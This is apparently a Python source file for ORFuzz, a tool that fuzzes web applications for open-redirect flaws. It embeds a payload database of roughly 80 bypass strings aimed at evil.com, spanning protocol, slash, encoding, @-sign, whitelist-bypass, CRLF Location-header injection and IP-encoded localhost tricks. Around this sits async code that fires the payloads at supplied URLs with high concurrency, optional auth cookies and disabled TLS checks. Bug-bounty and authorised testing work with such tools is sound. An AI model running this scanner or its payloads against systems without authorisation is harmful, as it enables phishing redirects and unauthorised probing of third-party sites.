"""
ORFuzz - Open Redirect Vulnerability Fuzzer
For security research and bug bounty hunting.
"""

import asyncio
import aiohttp
import argparse
import sys
import socket
import json
import csv
import time
from datetime import datetime
from aiohttp import (
    ClientConnectorError, ClientOSError, ServerDisconnectedError,
    ServerTimeoutError, ServerConnectionError, TooManyRedirects
)
from tqdm import tqdm
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List, Optional, Dict
from pathlib import Path
from dataclasses import dataclass, field, asdict


# ─── Colors ──────────────────────────────────────────────────────────────────────────────
R   = '\033[0m'
RED = '\033[91m'
GRN = '\033[92m'
YLW = '\033[93m'
BLU = '\033[94m'
MAG = '\033[95m'
CYN = '\033[96m'
DIM = '\033[2m'
BLD = '\033[1m'

BANNER = (
    CYN + BLD
    + "\n"
    + "   ██████╗  ██████╗  ███████╗ ██╗   ██╗ ███████╗ ███████╗\n"
    + "  ██╔═══██╗ ██╔══██╗ ██╔════╝ ██║   ██║    ███╔╝    ███╔╝\n"
    + "  ██║   ██║ ██████╔╝ █████╗   ██║   ██║   ███╔╝    ███╔╝ \n"
    + "  ██║   ██║ ██╔══██╗ ██╔══╝   ██║   ██║  ███╔╝    ███╔╝  \n"
    + "  ╚██████╔╝ ██║  ██║ ██║      ╚██████╔╝ ███████╗ ███████╗\n"
    + "   ╚═════╝  ╚═╝  ╚═╝ ╚═╝       ╚═════╝ ╚══════╝ ╚══════╝\n"
    + R + DIM
    + "\n  Open Redirect Fuzzer  ·  Bug Bounty Edition"
    + R + "\n"
)



# ─── Payload Database ───────────────────────────────────────────────────────────
PAYLOADS: Dict[str, List[str]] = {

    "classic": [
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "https://evil.com",
        "http://evil.com",
        "//evil.com/%2f..",
        "///evil.com/%2f..",
        "////evil.com/%2f..",
    ],

    "protocol_bypass": [
        "/https://evil.com",
        "/http://evil.com",
        "/https:evil.com",
        "/https:/evil.com",
        "/%2f%2fevil.com",
        "/%5cevil.com",
        "//%5cevil.com",
        "///%5cevil.com",
        "////%5cevil.com",
        "/https:/%5cevil.com/",
        "/https://%09/evil.com",
        "/https://%5cevil.com",
        "/%09/evil.com",
        "//%09/evil.com",
        "///%09/evil.com",
        "////%09/evil.com",
        "/https:///evil.com/%2e%2e",
        "/https:///evil.com/%2f%2e%2e",
    ],

    "slash_bypass": [
        "/https://evil.com/%2e%2e",
        "/https://evil.com/%2e%2e%2f",
        "/https://evil.com/%2f%2e%2e",
        "/https://evil.com/%2f..",
        "/https://evil.com//",
        "//evil.com/%2f%2e%2e",
        "//evil.com/%2f..",
        "//evil.com@google.com/%2f..",
        "///google.com/%2f..",
        "///evil.com@google.com/%2f..",
        "////google.com/%2f..",
        "//evil.com/%2f%2e%2e",
        "//evil.com@google.com/%2f%2e%2e",
        "///google.com/%2f%2e%2e",
        "///evil.com@google.com/%2f%2e%2e",
        "////google.com/%2f%2e%2e",
    ],

    "encoded": [
        "/%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
        "/%2f%5c%2f%65%76%69%6c%2e%63%6f%6d/",
        "//evil%E3%80%82com",
        "//evil%00.com",
        "/https://evil%E3%80%82com",
        "//evil.com%23@legitimate.com",
        "//evil.com%2523@legitimate.com",
        "https://evil.com%2523@legitimate.com",
        "//legitimate.com%2f@evil.com/",
    ],

    "at_sign": [
        "//evil.com@legitimate.com",
        "///evil.com@legitimate.com",
        "/https://evil.com@legitimate.com",
        "https://evil.com@legitimate.com/%2f..",
        "////;@evil.com",
        "////evil.com/",
        "/////evil.com",
        "/////evil.com/",
    ],

    "whitelisted_bypass": [
        "//legitimate.com.evil.com",
        "//legitimate.com%2eevil.com",
        "/https://legitimate.comevil.com",
        "//legitimate.com\\.evil.com",
        "///legitimate.com\\.evil.com",
        "/http://evil.com",
        "/http:/evil.com",
        "/.evil.com",
        "//evil.com/legitimate.com",
    ],

    "crlf_chain": [
        "/https://evil.com%0d%0aLocation:https://evil.com",
        "/https://evil.com%0aLocation:https://evil.com",
        "/%0d%0aLocation:https://evil.com",
        "/%0aLocation:https://evil.com",
    ],

    "fragment": [
        "/https://evil.com#",
        "//evil.com/#legitimate.com",
        "https://evil.com/#legitimate.com",
        "/https://evil.com//%2e%2e#legitimate.com",
    ],

    "ip_based": [
        "http://2130706433",           # 127.0.0.1 decimal
        "http://0x7f000001",           # 127.0.0.1 hex
        "http://0177.0.0.1",           # 127.0.0.1 octal
        "//2130706433",
        "//0x7f000001",
    ],
}

ALL_PAYLOADS = [p for group in PAYLOADS.values() for p in group]


# ─── Result Model ───────────────────────────────────────────────────────────────
@dataclass
class Finding:
    url: str
    payload: str
    filled_url: str
    final_url: str
    redirect_chain: List[str]
    status_code: int
    category: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())

    def to_dict(self):
        return asdict(self)


# ─── URL Utilities ──────────────────────────────────────────────────────────────
def fuzzify_url(url: str, keyword: str) -> str:
    if keyword in url:
        return url
    parsed = urlparse(url)
    params = parse_qsl(parsed.query)
    if not params:
        return url
    fuzzed_params = [(k, keyword) for k, _ in params]
    fuzzed_query = urlencode(fuzzed_params)
    return urlunparse([parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, fuzzed_query, parsed.fragment])


def classify_redirect(chain: List[str], target_domain: str) -> Optional[str]:
    """Classify the type of open redirect found."""
    for url in chain:
        if target_domain.lower() in url.lower():
            return "EXTERNAL_REDIRECT"
    return None


def detect_target_in_chain(chain: List[str], keywords: List[str]) -> bool:
    for url in chain:
        for kw in keywords:
            if kw.lower() in url.lower():
                return True
    return False


def load_urls_from_stdin(keyword: str) -> List[str]:
    urls = []
    for line in sys.stdin:
        url = line.strip()
        if url:
            fuzzed = fuzzify_url(url, keyword)
            urls.append(fuzzed)
    return urls


# ─── HTTP Fetch ─────────────────────────────────────────────────────────────────
async def fetch_url(session: aiohttp.ClientSession, url: str, timeout: int):
    try:
        async with session.head(
            url,
            allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=timeout)
        ) as resp:
            return resp
    except (
        ClientConnectorError, ClientOSError, ServerDisconnectedError,
        ServerTimeoutError, ServerConnectionError, TooManyRedirects,
        UnicodeDecodeError, socket.gaierror, asyncio.TimeoutError,
        ValueError
    ):
        return None


# ─── Core Processing ────────────────────────────────────────────────────────────
async def process_url(
    semaphore: asyncio.Semaphore,
    session: aiohttp.ClientSession,
    url: str,
    payloads: List[str],
    keyword: str,
    target_keywords: List[str],
    pbar: tqdm,
    findings: List[Finding],
    timeout: int,
    verbose: bool,
):
    async with semaphore:
        for payload in payloads:
            filled_url = url.replace(keyword, payload)
            response = await fetch_url(session, filled_url, timeout)

            if response and response.history:
                chain = [str(r.url) for r in response.history] + [str(response.url)]
                chain_str = " → ".join(chain)
                final_url = str(response.url)
                status = response.status

                is_vuln = detect_target_in_chain(chain[1:], target_keywords)

                if is_vuln:
                    finding = Finding(
                        url=url,
                        payload=payload,
                        filled_url=filled_url,
                        final_url=final_url,
                        redirect_chain=chain,
                        status_code=status,
                        category=classify_redirect(chain, target_keywords[0]) or "OPEN_REDIRECT",
                    )
                    findings.append(finding)
                    tqdm.write(
                        f"\n{BLD}{GRN}[VULN]{R} {GRN}{filled_url}{R}\n"
                        f"       {DIM}Chain:{R} {CYN}{chain_str}{R}\n"
                        f"       {DIM}Status:{R} {YLW}{status}{R}"
                    )
                elif verbose and len(chain) > 1:
                    tqdm.write(f"{DIM}[REDIR] {filled_url} → {final_url} ({status}){R}")

            pbar.update()


async def run(args):
    # ── Load payloads ────────────────────────────────────────────────────────
    if args.payloads:
        with open(args.payloads) as f:
            payloads = [l.strip() for l in f if l.strip()]
        tqdm.write(f"{BLU}[INFO]{R} Loaded {len(payloads)} payloads from file.")
    elif args.categories:
        payloads = []
        for cat in args.categories:
            if cat in PAYLOADS:
                payloads.extend(PAYLOADS[cat])
                tqdm.write(f"{BLU}[INFO]{R} Category '{cat}': {len(PAYLOADS[cat])} payloads loaded.")
            else:
                tqdm.write(f"{YLW}[WARN]{R} Unknown category '{cat}'. Available: {', '.join(PAYLOADS.keys())}")
        if not payloads:
            payloads = ALL_PAYLOADS
    else:
        payloads = ALL_PAYLOADS

    # ── Replace placeholder domain ───────────────────────────────────────────
    target_domain = args.target or "evil.com"
    payloads = [p.replace("evil.com", target_domain).replace("google.com", args.legit or "google.com")
                for p in payloads]

    # ── Load URLs ────────────────────────────────────────────────────────────
    if sys.stdin.isatty() and not args.url:
        print(f"{RED}[ERROR]{R} Provide URLs via stdin or -u/--url. Example:\n"
              f"  cat urls.txt | python orfuzz.py --target evil.com\n"
              f"  echo 'https://site.com/redir?url=FUZZ' | python orfuzz.py")
        sys.exit(1)

    if args.url:
        raw_urls = args.url
    else:
        raw_urls = [line.strip() for line in sys.stdin if line.strip()]

    urls = [fuzzify_url(u, args.keyword) for u in raw_urls]

    tqdm.write(f"{BLU}[INFO]{R} {BLD}{len(urls)}{R} URLs × {BLD}{len(payloads)}{R} payloads "
               f"= {BLD}{len(urls) * len(payloads)}{R} requests")
    tqdm.write(f"{BLU}[INFO]{R} Target indicator: {CYN}{target_domain}{R} | "
               f"Concurrency: {CYN}{args.concurrency}{R} | Timeout: {CYN}{args.timeout}s{R}\n")

    # ── Build HTTP session ───────────────────────────────────────────────────
    headers = {"User-Agent": args.user_agent or "Mozilla/5.0 (ORFuzz/2.0; BugBounty)"}
    if args.headers:
        for h in args.headers:
            k, _, v = h.partition(":")
            headers[k.strip()] = v.strip()

    cookies = {}
    if args.cookies:
        for c in args.cookies:
            k, _, v = c.partition("=")
            cookies[k.strip()] = v.strip()

    connector = aiohttp.TCPConnector(ssl=not args.no_verify, limit=args.concurrency + 50)
    session_kwargs = dict(headers=headers, cookies=cookies, connector=connector)

    findings: List[Finding] = []
    start_time = time.time()

    async with aiohttp.ClientSession(**session_kwargs) as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        total = len(urls) * len(payloads)

        with tqdm(total=total, ncols=80, desc="Fuzzing", unit="req",
                  bar_format="{l_bar}%s{bar}%s{r_bar}" % (CYN, R)) as pbar:
            tasks = [
                process_url(
                    semaphore, session, url, payloads,
                    args.keyword, [target_domain], pbar,
                    findings, args.timeout, args.verbose
                )
                for url in urls
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start_time

    # ── Summary ──────────────────────────────────────────────────────────────
    print(f"\n{BLD}{'─'*60}{R}")
    print(f"  {BLD}Scan complete{R} in {YLW}{elapsed:.1f}s{R}")
    print(f"  Requests sent : {BLD}{len(urls) * len(payloads)}{R}")
    print(f"  Vulnerabilities found : {BLD}{GRN if findings else RED}{len(findings)}{R}")
    print(f"{BLD}{'─'*60}{R}\n")

    if findings:
        print(f"{GRN}{BLD}[FINDINGS]{R}")
        for i, f in enumerate(findings, 1):
            print(f"  {i}. {GRN}{f.filled_url}{R}")
            print(f"     Chain: {' → '.join(f.redirect_chain)}")
            print()

    # ── Export ───────────────────────────────────────────────────────────────
    if args.output:
        out_path = Path(args.output)
        ext = out_path.suffix.lower()

        if ext == ".json":
            with open(out_path, "w") as fh:
                json.dump([f.to_dict() for f in findings], fh, indent=2)
        elif ext == ".csv":
            if findings:
                with open(out_path, "w", newline="") as fh:
                    writer = csv.DictWriter(fh, fieldnames=findings[0].to_dict().keys())
                    writer.writeheader()
                    writer.writerows([f.to_dict() for f in findings])
            else:
                out_path.write_text("")
        elif ext == ".txt":
            with open(out_path, "w") as fh:
                for f in findings:
                    fh.write(f"{f.filled_url}\t{' → '.join(f.redirect_chain)}\n")
        else:
            # default: JSON
            with open(out_path, "w") as fh:
                json.dump([f.to_dict() for f in findings], fh, indent=2)

        print(f"{BLU}[INFO]{R} Results saved to {CYN}{out_path}{R}")

    return findings


# ─── CLI ────────────────────────────────────────────────────────────────────────
def build_parser():
    parser = argparse.ArgumentParser(
        prog="orfuzz",
        description="ORFuzz — Advanced Open Redirect Fuzzer",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
{BLD}Examples:{R}
  # Pipe URLs from file, test against evil.com
  cat urls.txt | python orfuzz.py --target evil.com

  # Single URL with custom concurrency and output
  echo 'https://site.com/redirect?next=FUZZ' | \\
    python orfuzz.py --target attacker.com -c 50 -o results.json

  # Use only bypass categories + custom headers
  cat urls.txt | python orfuzz.py \\
    --categories protocol_bypass slash_bypass \\
    --header "Authorization: Bearer TOKEN" \\
    --cookie "session=abc123"

  # List available payload categories
  python orfuzz.py --list-categories
        """
    )

    parser.add_argument('-u', '--url', nargs='+', metavar='URL',
                        help='URL(s) to test (alternative to stdin)')
    parser.add_argument('-t', '--target', default='evil.com',
                        help='Domain to detect as successful redirect (default: evil.com)')
    parser.add_argument('--legit', default='google.com',
                        help='Legitimate domain for whitelisted bypass payloads (default: google.com)')
    parser.add_argument('-p', '--payloads', metavar='FILE',
                        help='Custom payloads file (one per line)')
    parser.add_argument('--categories', nargs='+', metavar='CAT',
                        help=f'Payload categories to use. Available: {", ".join(PAYLOADS.keys())}')
    parser.add_argument('-k', '--keyword', default='FUZZ',
                        help='Keyword to replace in URLs (default: FUZZ)')
    parser.add_argument('-c', '--concurrency', type=int, default=50,
                        help='Concurrent requests (default: 50)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('-H', '--header', dest='headers', action='append', metavar='Header: value',
                        help='Custom HTTP header (repeatable)')
    parser.add_argument('-b', '--cookie', dest='cookies', action='append', metavar='name=value',
                        help='Cookie (repeatable)')
    parser.add_argument('-A', '--user-agent', metavar='UA',
                        help='Custom User-Agent string')
    parser.add_argument('--no-verify', action='store_true',
                        help='Disable SSL certificate verification')
    parser.add_argument('-o', '--output', metavar='FILE',
                        help='Save findings to file (.json, .csv, or .txt)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show all redirects, not only vulnerabilities')
    parser.add_argument('--list-categories', action='store_true',
                        help='List payload categories and exit')
    return parser


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()

    if args.list_categories:
        print(f"{BLD}Available payload categories:{R}\n")
        for cat, payloads in PAYLOADS.items():
            print(f"  {CYN}{cat:<22}{R} {DIM}({len(payloads)} payloads){R}")
        print(f"\n  {YLW}all{R}                    {DIM}({len(ALL_PAYLOADS)} payloads total){R}\n")
        sys.exit(0)

    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        print(f"\n{YLW}[!]{R} Interrupted. Exiting.")
        sys.exit(0)


if __name__ == "__main__":
    main()